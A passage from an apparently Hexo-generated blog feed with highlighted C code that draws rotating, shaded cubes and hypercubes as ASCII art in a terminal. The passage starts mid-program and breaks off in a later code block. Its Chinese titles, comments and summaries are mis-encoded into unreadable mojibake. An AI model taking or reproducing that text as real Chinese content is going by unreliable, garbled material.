class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])+eOffest&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                &amp;&amp;(tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])-eOffest&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])))</span><br><span class="line">                            inside=<span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(inside)&#123;</span><br><span class="line">                        <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ–¹ç¨‹é˜ˆå€¼æ£€éªŒ</span></span><br><span class="line"><span class="comment">                        if(sx==0)&#123;</span></span><br><span class="line"><span class="comment">                            for(int i=0;i&lt;3&amp;&amp;inside;i++)&#123;</span></span><br><span class="line"><span class="comment">                                double b=(tCenter[1]-y[i==0?1:i==1?0:0])*(x[i==0?2:i==1?2:1]-x[i==0?1:i==1?0:0]);</span></span><br><span class="line"><span class="comment">                                double c=(y[i==0?2:i==1?2:1]-y[i==0?1:i==1?0:0])*(tCenter[0]-x[i==0?1:i==1?0:0]);\</span></span><br><span class="line"><span class="comment">                                double d=b-c;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                        //*/</span></span><br><span class="line">                        <span class="keyword">float</span> alpha,currentDis,p[<span class="number">4</span>];</span><br><span class="line">                        <span class="keyword">if</span>(transparent) out_f[sy][sx]=out_f[sy][sx]&lt;<span class="number">0</span>?<span class="number">1</span>:out_f[sy][sx]+<span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span>&#123;<span class="comment">//æ±‚ä¸‰è§’å½¢å¹³é¢æ–¹ç¨‹ç®—å‡ºç‚¹åˆ°å±å¹•è·ç¦»</span></span><br><span class="line">                            p[<span class="number">0</span>]= yb[<span class="number">0</span>]*z[<span class="number">1</span>] -yb[<span class="number">0</span>]*z[<span class="number">2</span>] -yb[<span class="number">1</span>]*z[<span class="number">0</span>] +yb[<span class="number">1</span>]*z[<span class="number">2</span>] +yb[<span class="number">2</span>]*z[<span class="number">0</span>] -yb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">1</span>]=-xb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">0</span>]*z[<span class="number">2</span>] +xb[<span class="number">1</span>]*z[<span class="number">0</span>] -xb[<span class="number">1</span>]*z[<span class="number">2</span>] -xb[<span class="number">2</span>]*z[<span class="number">0</span>] +xb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">2</span>]= xb[<span class="number">0</span>]*yb[<span class="number">1</span>] -xb[<span class="number">0</span>]*yb[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">0</span>] +xb[<span class="number">1</span>]*yb[<span class="number">2</span>] +xb[<span class="number">2</span>]*yb[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">3</span>]=-xb[<span class="number">0</span>]*yb[<span class="number">1</span>]*z[<span class="number">2</span>] +xb[<span class="number">0</span>]*yb[<span class="number">2</span>]*z[<span class="number">1</span>] +xb[<span class="number">1</span>]*yb[<span class="number">0</span>]*z[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">2</span>]*z[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">2</span>]*yb[<span class="number">1</span>]*z[<span class="number">0</span>];</span><br><span class="line">                            currentDis=lightSrcDis*(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)+p[<span class="number">3</span>])/(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)-p[<span class="number">2</span>]*lightSrcDis);</span><br><span class="line">                            <span class="keyword">if</span>(currentDis&gt;dis[sy][sx])&#123;</span><br><span class="line">                                alpha=<span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) alpha+=normalResultSet[normalIndex*<span class="number">3</span>+i]*light[i];</span><br><span class="line">                                dis[sy][sx]=currentDis;</span><br><span class="line">                                out_f[sy][sx]=alpha&gt;<span class="number">1</span>||alpha&lt;<span class="number">-1</span>?alpha&gt;<span class="number">1</span>?<span class="number">10</span>:<span class="number">0</span>:(alpha*<span class="number">10</span>+<span class="number">10</span>)*<span class="number">0.5</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="comment">///*è¾“å‡ºåˆ°ç»ˆç«¯</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,outIndex;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!transparent) outIndex=(<span class="keyword">int</span>)out_f[i][j];</span><br><span class="line">                <span class="keyword">else</span> outIndex=(<span class="keyword">int</span>)(<span class="built_in">pow</span>((<span class="number">1</span><span class="number">-1</span>/(transparent*out_f[i][j]+<span class="number">1</span>)),<span class="number">2</span>)*<span class="number">10</span>);</span><br><span class="line">                out_f[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>,shade[outIndex],shade[outIndex],shade[outIndex]):<span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(<span class="number">15</span>);</span><br><span class="line">        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p align="right"><small>Correct, but not totally correct, meet hypercubes O(âˆ©_âˆ©)O</small></p>    </div></div><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;Meet Hypercubes~ O(âˆ©_âˆ©)O&lt;/p&gt;
&lt;p&gt;ğŸ¦è¯­è¨€æ¸²æŸ“nç»´ç«‹æ–¹ä½“è‡³ç»ˆç«¯ï¼Œé‚£çœŸæ˜¯éå¸¸amazingå•Š&lt;/p&gt;
&lt;img src=&quot;/images/4Hypercube-transparent.gif&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt;</summary>
    
    
    
    <category term="æ‘¸é±¼" scheme="https://kyriota.github.io/categories/%E6%91%B8%E9%B1%BC/"/>
    
    
    <category term="å›¾å½¢å­¦" scheme="https://kyriota.github.io/tags/%E5%9B%BE%E5%BD%A2%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>å›¾å½¢å­¦HelloWorld</title>
    <link href="https://kyriota.github.io/2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/"/>
    <id>https://kyriota.github.io/2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/</id>
    <published>2021-04-18T17:24:55.000Z</published>
    <updated>2021-04-20T18:19:18.368Z</updated>
    
    <content type="html"><![CDATA[<p>é€›bç«™çœ‹åˆ°ä¼šè½¬çš„ç”œç”œåœˆï¼Œå¯¹å›¾å½¢å­¦æœ‰ç‚¹ä¸Šå¤´ï¼Œè‡ªå·±æ‹¿èœ¥è¯­è¨€åšä¸ªç«‹æ–¹ä½“ç©ç©</p><img src="/images/å›¾å½¢å­¦HelloWorld.gif" height="200" width="200" /><span id="more"></span><h1 id="å›¾å½¢å­¦HelloWorld"><a href="#å›¾å½¢å­¦HelloWorld" class="headerlink" title="å›¾å½¢å­¦HelloWorld"></a>å›¾å½¢å­¦HelloWorld</h1><p>æ—¢ç„¶æ˜¯HelloWorldé‚£å°±æ²¡ä»€ä¹ˆå¥½è§£é‡Šçš„äº†O(âˆ©_âˆ©)O</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 51<span class="comment">//è§„å®šå±å¹•å¤§å°</span></span></span><br><span class="line"><span class="comment">////cal_rç”¨æ¥ç®—ä¸ªæ¨¡é•¿</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">cal_r</span><span class="params">(<span class="keyword">float</span> x,<span class="keyword">float</span> y,<span class="keyword">float</span> z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(x*x+y*y+z*z);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,;!o*m0&amp;%@&quot;</span>;<span class="comment">//é˜´å½±å­—ç¬¦é›†</span></span><br><span class="line"><span class="keyword">int</span> out_i[size][size];<span class="comment">//è®°å½•äº®åº¦ï¼Œæ˜ å°„åˆ°å­—ç¬¦é›†</span></span><br><span class="line"><span class="keyword">float</span> dyn=<span class="number">4.0</span>;<span class="comment">//å¼€åˆå¹…åº¦</span></span><br><span class="line"><span class="keyword">float</span> a=<span class="number">8.0</span>;<span class="comment">//ç«‹æ–¹ä½“è¾¹é•¿</span></span><br><span class="line"><span class="keyword">float</span> delta=<span class="number">0.75</span>;<span class="comment">//éå†ç«‹æ–¹ä½“çš„æ­¥é•¿</span></span><br><span class="line"><span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;<span class="comment">//ä»åæ ‡åŸç‚¹åç§»åˆ°å±å¹•ä¸­å¿ƒæ‰€éœ€çš„åç§»é‡</span></span><br><span class="line"><span class="keyword">float</span> dis[size][size];<span class="comment">//è®°å½•æœ€å°è·ç¦»ï¼Œç”±æ­¤åˆ¤æ–­é®ç½©å…³ç³»</span></span><br><span class="line"><span class="comment">//cal_shadeç”¨æ¥ç®—ä¸ªé˜´å½±</span></span><br><span class="line"><span class="comment">//Par&#123;n_iæ˜¯è¢«é€‰ä¸­ç›¸å¯¹ä¸å˜çš„æ–¹å‘,ç›¸å½“äºæ­¤æ–¹å‘ç©¿è¿‡å¹³é¢;n_jä½œä¸ºåˆ¤å®šæ˜¯ä¸Šå¹³é¢è¿˜æ˜¯ä¸‹å¹³é¢çš„å€¼ï¼Œåªå¯èƒ½æ˜¯1æˆ–-1&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal_shade</span><span class="params">(<span class="keyword">float</span> *n,<span class="keyword">int</span> n_i,<span class="keyword">int</span> n_j,<span class="keyword">float</span> *ro_a,<span class="keyword">float</span> *ro_b,<span class="keyword">float</span> *ro_c,<span class="keyword">float</span> *light,<span class="keyword">float</span> rotate,<span class="keyword">int</span> *out_i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)n[i]=i==n_i?n_j:<span class="number">0</span>;<span class="comment">//ç¡®å®šåŸå§‹æ³•å‘é‡n[]</span></span><br><span class="line">    <span class="keyword">float</span> n_a[<span class="number">3</span>]=&#123;n[<span class="number">0</span>]*ro_a[<span class="number">0</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">3</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">6</span>],</span><br><span class="line">                   n[<span class="number">0</span>]*ro_a[<span class="number">1</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">4</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">7</span>],</span><br><span class="line">                   n[<span class="number">0</span>]*ro_a[<span class="number">2</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">5</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">8</span>]&#125;;<span class="comment">//æ³•å‘é‡ç¬¬ä¸€æ¬¡æ—‹è½¬</span></span><br><span class="line">    <span class="keyword">float</span> n_b[<span class="number">3</span>]=&#123;n_a[<span class="number">0</span>]*ro_b[<span class="number">0</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">3</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">6</span>],</span><br><span class="line">                   n_a[<span class="number">0</span>]*ro_b[<span class="number">1</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">4</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">7</span>],</span><br><span class="line">                   n_a[<span class="number">0</span>]*ro_b[<span class="number">2</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">5</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">8</span>]&#125;;<span class="comment">//æ³•å‘é‡ç¬¬äºŒæ¬¡æ—‹è½¬</span></span><br><span class="line">    <span class="keyword">float</span> n_r[<span class="number">3</span>]=&#123;n_b[<span class="number">0</span>]*ro_c[<span class="number">0</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">3</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">6</span>],</span><br><span class="line">                   n_b[<span class="number">0</span>]*ro_c[<span class="number">1</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">4</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">7</span>],</span><br><span class="line">                   n_b[<span class="number">0</span>]*ro_c[<span class="number">2</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">5</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">8</span>]&#125;;</span><br><span class="line">    <span class="comment">//n_r[]ä½œä¸ºç»•ä¸‰è½´æ—‹è½¬rotateè§’åº¦åçš„æ³•å‘é‡</span></span><br><span class="line">    <span class="keyword">float</span> result=(n_r[<span class="number">0</span>]*light[<span class="number">0</span>]+n_r[<span class="number">1</span>]*light[<span class="number">1</span>]+n_r[<span class="number">2</span>]*light[<span class="number">2</span>]+<span class="number">1.0</span>)*<span class="number">0.5</span>;<span class="comment">//ç‚¹ç§¯æ±‚åå…‰å¼ºåº¦(äº®åº¦)ï¼Œå¹¶æ˜ å°„åˆ°[0,1]</span></span><br><span class="line">    <span class="keyword">float</span> co[<span class="number">3</span>];<span class="comment">//æ­£æ–¹ä½“çš„åŸå§‹åæ ‡ï¼Œcoæ„ä¸ºcoordinate</span></span><br><span class="line">    co[n_i]=dyn*<span class="built_in">cos</span>(rotate*<span class="number">2</span>);<span class="comment">//make it 20% cooler</span></span><br><span class="line">    <span class="keyword">int</span> co_a=n_i==<span class="number">0</span>?<span class="number">1</span>:n_i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> co_b=n_i==<span class="number">0</span>?<span class="number">2</span>:n_i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;<span class="comment">//ç¡®å®šäº†indexä¸ºn_içš„åæ ‡æ˜¯ä¸éœ€è¦è¢«éå†çš„</span></span><br><span class="line">    co[n_i]+=move/<span class="number">2</span>;<span class="comment">//æ— éœ€éå†çš„æ–¹å‘åç§»1/4ä¸ªå±å¹•è¾¹é•¿</span></span><br><span class="line">    <span class="keyword">for</span>(co[co_a]=-a;co[co_a]&lt;=a;co[co_a]+=delta)</span><br><span class="line">        <span class="keyword">for</span>(co[co_b]=-a;co[co_b]&lt;=a;co[co_b]+=delta)&#123;</span><br><span class="line">            <span class="keyword">int</span> <span class="keyword">final</span>=(<span class="keyword">int</span>)(result*<span class="number">10.0</span>);<span class="comment">//æŠŠäº®åº¦intåŒ–</span></span><br><span class="line">            <span class="keyword">final</span>=(<span class="keyword">final</span>&gt;<span class="number">10</span>||<span class="keyword">final</span>)&lt;<span class="number">0</span>?<span class="keyword">final</span>&gt;<span class="number">10</span>?<span class="number">10</span>:<span class="number">0</span>:<span class="keyword">final</span>;<span class="comment">//ä¿é™©ï¼Œé˜²æ­¢ä¸€äº›åˆé’»æƒ…å†µ</span></span><br><span class="line">            <span class="keyword">float</span> x_a=co[<span class="number">0</span>]*ro_a[<span class="number">0</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">3</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_a=co[<span class="number">0</span>]*ro_a[<span class="number">1</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">4</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_a=co[<span class="number">0</span>]*ro_a[<span class="number">2</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">5</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">8</span>];<span class="comment">//åæ ‡ç¬¬ä¸€æ¬¡æ—‹è½¬</span></span><br><span class="line">            <span class="keyword">float</span> x_b=x_a*ro_b[<span class="number">0</span>]+y_a*ro_b[<span class="number">3</span>]+z_a*ro_b[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_b=x_a*ro_b[<span class="number">1</span>]+y_a*ro_b[<span class="number">4</span>]+z_a*ro_b[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_b=x_a*ro_b[<span class="number">2</span>]+y_a*ro_b[<span class="number">5</span>]+z_a*ro_b[<span class="number">8</span>];<span class="comment">//åæ ‡ç¬¬äºŒæ¬¡æ—‹è½¬</span></span><br><span class="line">            <span class="keyword">float</span> x_r=x_b*ro_c[<span class="number">0</span>]+y_b*ro_c[<span class="number">3</span>]+z_b*ro_c[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_r=x_b*ro_c[<span class="number">1</span>]+y_b*ro_c[<span class="number">4</span>]+z_b*ro_c[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_r=x_b*ro_c[<span class="number">2</span>]+y_b*ro_c[<span class="number">5</span>]+z_b*ro_c[<span class="number">8</span>];</span><br><span class="line">            <span class="comment">//co_rä½œä¸ºç»•ä¸‰è½´æ—‹è½¬rotateè§’åº¦åçš„ç©ºé—´åæ ‡</span></span><br><span class="line">            <span class="keyword">int</span> cox=(<span class="keyword">int</span>)(n_j*x_r+move);</span><br><span class="line">            <span class="keyword">int</span> coy=(<span class="keyword">int</span>)(n_j*z_r+move);<span class="comment">//æ‰¾åˆ°æŠ•å½±åˆ°å±å¹•ä¸Šçš„ç‚¹åœ¨å“ª</span></span><br><span class="line">            <span class="keyword">if</span>(n_j*y_r&lt;dis[cox][coy])&#123;<span class="comment">//åªæœ‰å‘ç°æ›´è¿‘çš„ç‚¹æ‰æ›¿æ¢äº®åº¦</span></span><br><span class="line">                out_i[cox*size+coy]=<span class="keyword">final</span>;</span><br><span class="line">                dis[cox][coy]=n_j*y_r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> n[<span class="number">3</span>];<span class="comment">//åŸå§‹æ³•å‘é‡n[]</span></span><br><span class="line">    <span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;<span class="comment">//å¹³è¡Œå…‰å‘é‡</span></span><br><span class="line">    <span class="keyword">float</span> length=cal_r(light[<span class="number">0</span>],light[<span class="number">1</span>],light[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)light[i]/=length;<span class="comment">//å•ä½åŒ–å¹³è¡Œå…‰å‘é‡</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> rotate=<span class="number">0.0</span>;;rotate+=<span class="number">0.05</span>)&#123;<span class="comment">//rotateä¸ºæ—‹è½¬è§’åº¦ï¼Œå¢é‡å³æ—‹è½¬é€Ÿåº¦</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_i[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">4.0</span>*size);</span><br><span class="line">                <span class="comment">//åˆå§‹åŒ–äº®åº¦ä¸è·ç¦»</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">float</span> cos_ro=<span class="built_in">cos</span>(rotate),sin_ro=<span class="built_in">sin</span>(rotate);</span><br><span class="line">        <span class="keyword">float</span> ro_a[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1.0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,cos_ro,-sin_ro&#125;,&#123;<span class="number">0</span>,sin_ro,cos_ro&#125;&#125;;</span><br><span class="line">        <span class="keyword">float</span> ro_b[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;cos_ro,<span class="number">0</span>,sin_ro&#125;,&#123;<span class="number">0</span>,<span class="number">1.0</span>,<span class="number">0</span>&#125;,&#123;-sin_ro,<span class="number">0</span>,cos_ro&#125;&#125;;</span><br><span class="line">        <span class="keyword">float</span> ro_c[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;cos_ro,-sin_ro,<span class="number">0</span>&#125;,&#123;sin_ro,cos_ro,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1.0</span>&#125;&#125;;</span><br><span class="line">        <span class="comment">//æ—‹è½¬çŸ©é˜µï¼Œroè¡¨rotate</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;<span class="comment">//ç®—ä¸ªé˜´å½±ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ§åˆ¶å¯¹åº”é¢</span></span><br><span class="line">            cal_shade(&amp;n[<span class="number">0</span>],i,<span class="number">1</span>,&amp;ro_a[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_b[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_c[<span class="number">0</span>][<span class="number">0</span>],&amp;light[<span class="number">0</span>],rotate,&amp;out_i[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">            cal_shade(&amp;n[<span class="number">0</span>],i,<span class="number">-1</span>,&amp;ro_a[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_b[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_c[<span class="number">0</span>][<span class="number">0</span>],&amp;light[<span class="number">0</span>],rotate,&amp;out_i[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++) out_i[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[out_i[i][j]],shade[out_i[i][j]]):<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);</span><br><span class="line">        usleep(<span class="number">30000</span>);</span><br><span class="line">        <span class="comment">//è·Ÿç€ç”œç”œåœˆæŠ„çš„ï¼Œè¿™æ ·æ‰èƒ½ç¨³å®šä½å›¾åƒ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dev C++ä¸‹åˆ™è°ƒç”¨Windows.hæ¥è§£å†³å›¾åƒåˆ·æ–°çš„é—®é¢˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goto_O</span><span class="params">()</span><span class="comment">//CSDNä¸ŠæŠ„çš„å‡½æ•°ï¼Œåˆ·æ–°ä¸€å¿«å…‰æ ‡å°±é£˜æ¥é£˜å»ï¼Œçœ‹èµ·æ¥åƒå™ªç‚¹ä¸€æ ·</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hOut;</span><br><span class="line">    hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">    COORD pos = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    SetConsoleCursorPosition(hOut, pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld.gif"></p><p>æœ€å¼€å§‹å…ˆå†™äº†ä¸ªå…‰æºç§»åŠ¨çƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 